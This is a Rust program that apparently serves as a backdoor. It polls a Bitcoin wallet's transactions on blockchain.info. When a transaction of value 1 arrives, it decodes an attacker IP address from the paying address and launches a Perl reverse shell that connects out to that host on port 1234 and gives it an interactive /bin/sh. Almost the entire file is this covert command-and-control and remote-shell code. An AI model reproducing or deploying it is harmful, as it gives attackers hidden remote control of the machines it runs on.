extern crate curl;
extern crate serialize;

use std::str;
use std::io::Timer;
use std::time::Duration;
use std::io::Command;
use curl::http;
use serialize::json;
use base58::{ToBase58, FromBase58};

mod base58;

// Structs used to interpret JSON

#[deriving(Decodable, Encodable)]
pub struct Response {
  txs: Vec<Transaction>
}

#[deriving(Decodable, Encodable)]
pub struct Transaction {
	out: Vec<OutTransaction>
}

#[deriving(Decodable, Encodable)]
pub struct OutTransaction {
	addr: String,
	value: u32
}

fn main() {
	let wallet_addr = "14L55Bu9f4LsCS7ddK8FfftACYvGjyWWcC";
	let test_target_addr: [u8, ..4] = [192, 168, 153, 128];

	// Create a timer to space out the requests
	let mut timer = Timer::new().unwrap();
	let periodic = timer.periodic(Duration::seconds(5));

	// Runloop
	loop {
		periodic.recv();

		let resp = http::handle().get(format!("https://blockchain.info/address/{}?sort=0&filter=1&format=json", wallet_addr)).exec().unwrap();
		let json_resp = match str::from_utf8(resp.get_body()) {
	    Some(e) => e,
	    None => panic!("Invalid UTF-8 sequence"),
		};
		let decoded_resp: Response = json::decode(json_resp).unwrap();

	 	println!("{}", decoded_resp.txs[0].out[0].addr);
	 	println!("{}", decoded_resp.txs[0].out[0].value);

	  let decoded_addr = FromBase58::from_base58(decoded_resp.txs[0].out[0].addr.as_slice()).unwrap();

	  if(decoded_resp.txs[0].out[0].value == 1) {
	  	let script = format!("use Socket;$i=\"{:u}.{:u}.{:u}.{:u}\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};", decoded_addr[3], decoded_addr[4], decoded_addr[5], decoded_addr[6]);
			let mut process = match Command::new("perl").arg("-e").arg(script).spawn() {
			  Ok(p) => p,
			  Err(e) => panic!("failed to execute process: {}", e),
			};
	  }
	} 	
}